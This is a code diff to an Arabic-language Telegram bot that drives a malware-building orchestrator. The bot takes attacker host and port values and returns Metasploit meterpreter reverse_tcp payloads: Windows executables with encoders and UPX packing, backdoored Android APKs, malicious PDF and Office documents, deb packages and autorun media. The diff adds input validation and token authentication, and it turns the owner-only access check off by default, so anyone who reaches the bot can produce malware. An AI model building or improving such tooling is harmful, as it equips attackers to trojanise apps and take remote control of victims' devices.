@@ -3,7 +3,12 @@ import json
 import os
 import logging
 import hashlib
-import magic
+try:
+    import magic  # libmagic-based
+    _USE_MAGIC = True
+except Exception:
+    magic = None
+    _USE_MAGIC = False
 import zipfile
 import xml.etree.ElementTree as ET
 from dataclasses import dataclass
@@ -12,6 +17,7 @@ from pathlib import Path
 import aiofiles
 import aiohttp
 from datetime import datetime, timedelta
+import ipaddress
 
 import httpx
 from dotenv import load_dotenv
@@ -40,6 +46,11 @@ ORCH_URL = os.environ.get("ORCH_URL", "http://127.0.0.1:8000")
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 OWNER_ID = int(os.environ.get("TELEGRAM_OWNER_ID", "0"))
 
+# Phase 0 flags
+REQUIRE_OWNER_ID = os.environ.get("REQUIRE_OWNER_ID", "false").lower() == "true"
+ORCH_AUTH_TOKEN = os.environ.get("ORCH_AUTH_TOKEN", "")
+ENABLE_HTTP_ARTIFACTS = os.environ.get("ENABLE_HTTP_ARTIFACTS", "false").lower() == "true"
+
 # File upload configuration
 MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
 ALLOWED_EXTENSIONS = ['.apk']
@@ -51,6 +62,36 @@ UPLOAD_DIR.mkdir(exist_ok=True)
 TEMP_DIR.mkdir(exist_ok=True)
 
 MENU, PARAMS, UPLOAD_APK, UPLOAD_PARAMS = range(4)
+
+# Concise env check at startup (non-fatal)
+def _env_summary():
+    flags = {
+        "REQUIRE_OWNER_ID": REQUIRE_OWNER_ID,
+        "ORCH_AUTH_TOKEN": bool(ORCH_AUTH_TOKEN),
+    }
+    have_owner = OWNER_ID != 0
+    logger.info("BOT-ENV: owner_set=%s, flags=%s, orch_url=%s", have_owner, flags, ORCH_URL)
+    if REQUIRE_OWNER_ID and not have_owner:
+        logger.error("REQUIRE_OWNER_ID enabled but TELEGRAM_OWNER_ID not set. Exiting.")
+        raise SystemExit(2)
+
+_env_summary()
+
+def _valid_host(value: str) -> bool:
+    try:
+        ipaddress.ip_address(value)
+        return True
+    except Exception:
+        # Allow simple hostnames (letters, digits, hyphens, dots) 1-253 chars
+        if len(value) == 0 or len(value) > 253:
+            return False
+        return all(part and len(part) <= 63 and all(c.isalnum() or c == '-' for c in part) for part in value.split('.'))
+
+def _valid_port(value: str) -> bool:
+    if not value.isdigit():
+        return False
+    p = int(value)
+    return 1 <= p <= 65535
 
 @dataclass
 class Session:
@@ -101,29 +142,37 @@ class APKValidator:
                 return result
             
             # Check MIME type
-            mime_type = magic.from_file(str(file_path), mime=True)
-            if mime_type not in ['application/vnd.android.package-archive', 'application/zip']:
-                result["errors"].append(f"Invalid MIME type: {mime_type}")
-                return result
+            mime_type = None
+            if _USE_MAGIC:
+                try:
+                    mime_type = magic.from_file(str(file_path), mime=True)
+                except Exception:
+                    mime_type = None
+            if not mime_type:
+                try:
+                    import filetype
+                    kind = filetype.guess(str(file_path))
+                    if kind:
+                        mime_type = kind.mime
+                except Exception:
+                    mime_type = None
+            if mime_type not in ['application/vnd.android.package-archive', 'application/zip', None]:
+                result["warnings"].append(f"Unexpected MIME type: {mime_type}")
             
             # Validate ZIP structure
             try:
                 with zipfile.ZipFile(file_path, 'r') as apk_zip:
                     file_list = apk_zip.namelist()
-                    
                     # Check required APK files
                     required_files = ['AndroidManifest.xml', 'classes.dex']
                     missing_files = [f for f in required_files if f not in file_list]
-                    
                     if missing_files:
                         result["errors"].append(f"Missing required files: {missing_files}")
                         return result
-                    
                     # Extract basic info
                     result["info"]["file_count"] = len(file_list)
                     result["info"]["has_native_libs"] = any(f.startswith('lib/') for f in file_list)
                     result["info"]["has_resources"] = 'resources.arsc' in file_list
-                    
             except zipfile.BadZipFile:
                 result["errors"].append("Corrupted ZIP/APK file")
                 return result
@@ -212,7 +261,7 @@ class SecureFileManager:
         
         # Get file info
         file_size = secure_path.stat().st_size
-        mime_type = magic.from_file(str(secure_path), mime=True)
+        mime_type = magic.from_file(str(secure_path), mime=True) if _USE_MAGIC else "application/octet-stream"
         
         return FileUploadInfo(
             file_id=file_hash,
@@ -242,12 +291,13 @@ class SecureFileManager:
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     logger.info("/start received from user_id=%s", getattr(update.effective_user, "id", None))
-    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        if update.message:
-            await update.message.reply_text("تم رفض الوصول.")
-        elif update.callback_query:
-            await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
-        return ConversationHandler.END
+    if REQUIRE_OWNER_ID:
+        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+            if update.message:
+                await update.message.reply_text("تم رفض الوصول.")
+            elif update.callback_query:
+                await update.callback_query.answer("تم رفض الوصول.", show_alert=True)
+            return ConversationHandler.END
     
     kb = [
         [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
@@ -277,9 +327,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_uploaded_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle uploaded APK files"""
-    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("تم رفض الوصول.")
-        return ConversationHandler.END
+    if REQUIRE_OWNER_ID:
+        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+            await update.message.reply_text("تم رفض الوصول.")
+            return ConversationHandler.END
     
     if not update.message.document:
         await update.message.reply_text("يرجى إرسال ملف APK صحيح.")
@@ -408,6 +459,10 @@ async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYP
         return UPLOAD_PARAMS
     
     lhost, lport = parts[:2]
+    # Allow placeholders to trigger auto-detection on orchestrator side
+    placeholder_host = lhost.upper() in {"LHOST", "AUTO", "ANY"}
+    placeholder_port = lport.upper() in {"LPORT", "AUTO"}
+
     output_name = parts[2] if len(parts) >= 3 else sess.upload_file_info["original_name"].replace('.apk', '_backdoored')
     
     # Create task parameters
@@ -415,14 +470,18 @@ async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYP
         "mode": "upload_apk",
         "upload_file_path": sess.upload_file_path,
         "file_info": sess.upload_file_info,
-        "lhost": lhost,
-        "lport": lport,
         "output_name": output_name,
         "payload": "android/meterpreter/reverse_tcp"
     }
+    if not (placeholder_host or placeholder_port):
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة. تأكد من صيغة IP/اسم المضيف ونطاق المنفذ 1-65535.")
+            return UPLOAD_PARAMS
+        sess.params.update({"lhost": lhost, "lport": lport})
     
-    # Create task via API
-    async with httpx.AsyncClient(timeout=600) as client:
+    # Create task via API with optional Authorization
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
         resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": "upload_apk", "params": sess.params})
         resp.raise_for_status()
         data = resp.json()
@@ -580,32 +639,53 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("لا توجد جلسة نشطة. استخدم /start")
         return ConversationHandler.END
     parts = update.message.text.strip().split()
-    if sess.kind == "payload":
-        if len(parts) < 3:
-            await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME\nمثال: 192.168.1.10 4444 win_test")
+
+    if sess.kind in ("payload", "listener"):
+        # Validate basic host/port
+        need_output = (sess.kind == "payload")
+        min_parts = 3 if need_output else 2
+        if len(parts) < min_parts:
+            await update.message.reply_text("الاستخدام: LHOST LPORT{}".format(" OUTPUT_NAME" if need_output else ""))
             return PARAMS
-        lhost, lport, output_name = parts[:3]
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
+        lhost, lport = parts[:2]
+
+        # Allow placeholders to trigger auto-detection for listener
+        placeholder_host = lhost.upper() in {"LHOST", "AUTO", "ANY"}
+        placeholder_port = lport.upper() in {"LPORT", "AUTO"}
+
+        if sess.kind == "listener" and (placeholder_host or placeholder_port):
+            payload = "windows/meterpreter/reverse_tcp"
+            # Omit host/port so that orchestrator auto-detects them
+            sess.params = {"payload": payload}
+        else:
+            if not _valid_host(lhost) or not _valid_port(lport):
+                await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+                return PARAMS
+            if sess.kind == "payload":
+                output_name = parts[2]
+                payload = "windows/meterpreter/reverse_tcp"
+                sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": payload}
+            else:
+                payload = "windows/meterpreter/reverse_tcp"
+                sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
     elif sess.kind == "winexe":
         # advanced windows exe
         if len(parts) < 6:
             await update.message.reply_text("الاستخدام: LHOST LPORT OUTPUT_NAME ARCH ENCODERS UPX\nمثال: 127.0.0.1 4444 win_adv x86 x86/shikata_ga_nai:5 true")
             return PARAMS
         lhost, lport, output_name, arch, encoders, upx = parts[:6]
-        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
-    elif sess.kind == "listener":
-        if len(parts) < 2:
-            await update.message.reply_text("الاستخدام: LHOST LPORT\nمثال: 0.0.0.0 4444")
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
             return PARAMS
-        lhost, lport = parts[:2]
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
+        sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "arch": arch, "encoders": encoders, "upx": upx, "payload": "windows/meterpreter/reverse_tcp"}
     elif sess.kind == "android" and not sess.adv:
         if len(parts) < 2:
-            await update.message.reply_text("الاستخدام: LHOST LPORT\nأمثلة: 10.0.2.2 4444 أو 192.168.x.x 4444")
+            await update.message.reply_text("الاستخدام: LHOST LPORT")
             return PARAMS
         lhost, lport = parts[:2]
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
         payload = "android/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
     elif sess.kind == "android" and sess.adv:
@@ -613,6 +693,9 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("الاستخدام: MODE PERM LHOST LPORT [OUTPUT_NAME] [KEYSTORE:ALIAS:STOREPASS:KEYPASS]")
             return PARAMS
         mode, perm, lhost, lport = parts[:4]
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
         output_name = parts[4] if len(parts) >= 5 else "app_backdoor"
         ks_block = parts[5] if len(parts) >= 6 else ""
         sess.params = {"mode": mode, "perm_strategy": perm, "lhost": lhost, "lport": lport, "output_name": output_name, "payload": "android/meterpreter/reverse_tcp"}
@@ -628,8 +711,8 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lport = parts[1] if len(parts) >= 2 else ""
         output_name = parts[2] if len(parts) >= 3 else "document"
         base_pdf = parts[3] if len(parts) >= 4 else ""
-        if not lhost or not lport:
-            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME] [BASE_PDF_PATH]")
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
             return PARAMS
         sess.params = {"lhost": lhost, "lport": lport, "output_name": output_name, "payload": "windows/meterpreter/reverse_tcp"}
         if base_pdf:
@@ -640,16 +723,18 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return PARAMS
         target, lhost, lport, output_name = parts[:4]
         valid = {"ms_word_windows","ms_word_mac","openoffice_windows","openoffice_linux"}
-        if target not in valid:
-            await update.message.reply_text("TARGET غير صحيح. استخدم: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux")
+        if target not in valid or not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("مدخلات غير صحيحة.")
             return PARAMS
-        payload = "windows/meterpreter/reverse_tcp"
-        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
+        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": "windows/meterpreter/reverse_tcp", "output_name": output_name}
     elif sess.kind == "deb":
         if len(parts) < 4:
             await update.message.reply_text("الاستخدام: DEB_PATH LHOST LPORT OUTPUT_NAME\nمثال: /path/app.deb 127.0.0.1 4444 mydeb")
             return PARAMS
         deb_path, lhost, lport, output_name = parts[:4]
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة.")
+            return PARAMS
         sess.params = {"deb_path": deb_path, "lhost": lhost, "lport": lport, "output_name": output_name}
     elif sess.kind == "autorun":
         exe_path = parts[0] if len(parts) >= 1 else ""
@@ -669,7 +754,8 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
     # create task
-    async with httpx.AsyncClient(timeout=600) as client:
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
         resp = await client.post(f"{ORCH_URL}/tasks", json={"kind": sess.kind, "params": sess.params})
         resp.raise_for_status()
         data = resp.json()
@@ -682,44 +768,77 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def poll_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, sess: Session):
     chat_id = update.effective_chat.id
-    async with httpx.AsyncClient(timeout=600) as client:
-        for _ in range(60):
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    last_state = None
+    delay = 2
+    max_delay = 60 * 30  # 30 minutes
+    async with httpx.AsyncClient(timeout=600, headers=headers) as client:
+        for _ in range(1000):  # enough iterations with backoff
             r = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}")
             r.raise_for_status()
             task = r.json()["task"]
             state = task["state"]
-            state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
-            await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
+            if state != last_state:
+                state_ar = {"SUBMITTED":"تم الإرسال","PREPARING":"جارِ التحضير","RUNNING":"جارِ التنفيذ","SUCCEEDED":"تم بنجاح","FAILED":"فشل","CANCELLED":"أُلغي"}.get(state, state)
+                await context.bot.send_message(chat_id, f"الحالة: {state_ar}")
+                last_state = state
             if state in ("SUCCEEDED", "FAILED", "CANCELLED"):
                 if state == "SUCCEEDED":
                     arts = await client.get(f"{ORCH_URL}/tasks/{sess.task_id}/artifacts")
                     arts.raise_for_status()
                     artifacts = arts.json()
+                    # ملخص نهائي
+                    summary_lines = []
+                    for a in artifacts:
+                        name = a["name"]
+                        size_b = a.get("size_bytes", 0)
+                        sha = a.get("sha256", "")
+                        summary_lines.append(f"• {name} | {size_b} bytes | {sha}")
+                    await context.bot.send_message(chat_id, "الملخص النهائي للملفات:\n" + "\n".join(summary_lines))
+                    # إرسال الملفات نفسها (نفس آلية المرحلة 2)
                     if artifacts:
                         for a in artifacts:
-                            p = a["path"]
                             name = a["name"]
+                            path_or_url = a["path"]
                             try:
-                                with open(p, "rb") as f:
-                                    await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
+                                if ENABLE_HTTP_ARTIFACTS and path_or_url.startswith("/tasks/"):
+                                    url = f"{ORCH_URL}{path_or_url}"
+                                    async with client.stream("GET", url) as resp:
+                                        resp.raise_for_status()
+                                        tmpf = TEMP_DIR / f"{sess.task_id}_{name}"
+                                        async with aiofiles.open(tmpf, "wb") as f:
+                                            async for chunk in resp.aiter_bytes():
+                                                await f.write(chunk)
+                                    await context.bot.send_document(chat_id, document=InputFile((TEMP_DIR / f"{sess.task_id}_{name}").open("rb"), filename=name), caption="الملف الناتج")
+                                    try:
+                                        (TEMP_DIR / f"{sess.task_id}_{name}").unlink()
+                                    except Exception:
+                                        pass
+                                else:
+                                    with open(path_or_url, "rb") as f:
+                                        await context.bot.send_document(chat_id, document=InputFile(f, filename=name), caption="الملف الناتج")
                             except Exception as e:
                                 await context.bot.send_message(chat_id, f"تعذّر إرسال {name}: {e}")
                 else:
-                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state_ar}\nالخطأ: {task.get('error')}")
+                    # فشل/إلغاء: أرسل رابط تحميل build.log
+                    log_url = f"{ORCH_URL}/tasks/{sess.task_id}/logs/build"
+                    await context.bot.send_message(chat_id, f"انتهت المهمة بحالة: {state}\nسجل البناء: {log_url}")
                 return
-            await asyncio.sleep(2)
-    await context.bot.send_message(chat_id, "انتهت مهلة الانتظار دون إكمال المهمة")
+            await asyncio.sleep(delay)
+            delay = min(delay * 2, max_delay)
 
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("تم رفض الوصول.")
-        return
+    if REQUIRE_OWNER_ID:
+        if update.effective_user and OWNER_ID and update.effective_user.id != OWNER_ID:
+            await update.message.reply_text("تم رفض الوصول.")
+            return
     if not context.args:
         await update.message.reply_text("الاستخدام: /cancel <task_id>")
         return
     task_id = context.args[0]
-    async with httpx.AsyncClient(timeout=30) as client:
+    headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
+    async with httpx.AsyncClient(timeout=30, headers=headers) as client:
         r = await client.post(f"{ORCH_URL}/tasks/{task_id}/cancel")
         if r.status_code == 200:
             await update.message.reply_text(f"تم إلغاء المهمة: {task_id}")
@@ -731,6 +850,9 @@ def main():
     token = BOT_TOKEN
     if not token:
         print("Please set TELEGRAM_BOT_TOKEN in environment.")
+        return
+    if REQUIRE_OWNER_ID and OWNER_ID == 0:
+        print("REQUIRE_OWNER_ID is enabled but TELEGRAM_OWNER_ID is not set. Exiting.")
         return
     application = Application.builder().token(token).build()
     conv = ConversationHandler(
@@ -758,8 +880,10 @@ def main():
     logger.info("Starting polling...")
     try:
         application.run_polling(allowed_updates=("message","callback_query"), drop_pending_updates=True)
-    except Exception as e:
-        logger.exception("Bot crashed: %s", e)
+    except SystemExit:
+        raise
+    except Exception:
+        logger.exception("Bot stopped due to an error")
 
 
 if __name__ == "__main__":
